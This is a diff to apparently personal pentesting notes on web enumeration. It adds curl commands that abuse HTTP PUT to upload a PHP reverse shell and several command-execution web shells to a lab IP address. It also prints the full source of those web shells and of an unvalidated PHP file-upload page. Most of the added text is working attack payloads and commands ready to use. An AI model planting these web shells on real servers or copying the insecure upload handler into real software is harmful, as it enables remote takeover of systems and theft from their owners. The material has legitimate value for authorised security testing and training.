@@ -97,3 +97,49 @@ Web enumeration means to look out info about services running on port, versions,
 	# curl -X DELETE 192.168.1.100
 	# curl 192.168.1.100/uploads --upload-file demo.txt
 	# curl -I 192.168.1.100
+	# curl -T 1.txt http://192.168.0.105/test
+
+	# curl -T php-reverse-shell.php http://192.168.0.105/test
+
+	# curl -X PUT -T "php-reverse-shell.php" http://192.168.0.105/test
+
+	# curl --upload-file php-reverse-shell.php http://192.168.0.105/test
+
+	# curl -X PUT --upload-file "php-reverse-shell.php" http://192.168.0.105/test
+
+	# curl -X PUT -d "hi" http://192.168.0.105/test/demo.txt
+		
+	# curl -X PUT -d "<?php phpinf(); ?>" http://192.168.0.105/test/phpinfo.php
+		
+	# curl --request PUT --url http://192.168.0.105/test/demo.txt --header 'content-type: application/x-www-form-urlencoded' --data 'Demo'  
+		
+	# curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.0.105/test/rshell.php
+		
+	# cat /usr/share/webshells/php/simple-backdoor.php
+		
+	# curl --request PUT --url http://192.168.0.105/test/rshell.php --header 'content-type: application/x-www-form-urlencoded' --data '<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>'
+		
+#### rshell.php
+		
+				
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+		
+	# curl --request PUT --url http://192.168.0.105/test/rshell.php  --header 'content-type: application/x-www-form-urlencoded' --data '<!doctypehtml><html><head><title> CMD Shell with POST </title></head><body><form action="<?php echo $_SERVER['PHP_SELF'];?>" method="get">CMD:<br> <input name="cmd" type="text"> <br><input name="submit" type="submit" value="cmd"> <br></form><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd= ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?></body></html>'
+
+#### rshell-post.php
+		
+	# curl --request PUT --url http://192.168.0.105/test/rshell.php  --header 'content-type: application/x-www-form-urlencoded' --data '<!doctypehtml><html><head><title> CMD Shell with POST </title></head><body><form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">CMD:<br> <input name="cmd" type="text"> <br><input name="submit" type="submit" value="cmd"> <br></form><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd= ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?></body></html>'
+			
+				
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<!doctypehtml><html><head><title> CMD Shell with POST </title></head><body><form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">CMD:<br> <input name="cmd" type="text"> <br><input name="submit" type="submit" value="cmd"> <br></form><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd= ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?></body></html>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		
+				
+#### file_upload.php
+					 
+		<!doctypehtml><html><head><title>Form - Fileupload</title></head><body><form action="fileupload.php"enctype="multipart/form-data"method="post">Select File to Upload:<br><input name="filetoupload"type="file"><br><input name="submit"type="submit"value="Upload"><br></form><?php if(isset($_POST['submit'])){$file_name=$_FILES["filetoupload"]["name"];$file_type=$_FILES["filetoupload"]["type"];$file_tmp_name=$_FILES["filetoupload"]["tmp_name"];$file_error=$_FILES["filetoupload"]["error"];$file_size=$_FILES["filetoupload"]["size"];echo"File Name = {$file_name} <br />";echo"File Type = {$file_type} <br />";echo"File Tmp Name = {$file_tmp_name}<br />";echo"File Error = {$file_error} <br />";echo"File Size = {$file_size} <br />";if(move_uploaded_file($file_tmp_name,$file_name)){echo "File Uploaded Successfully";}else{echo "Could not Upload file";}}else{echo "Form was not submitted <br />";} ?></body></html>
+		
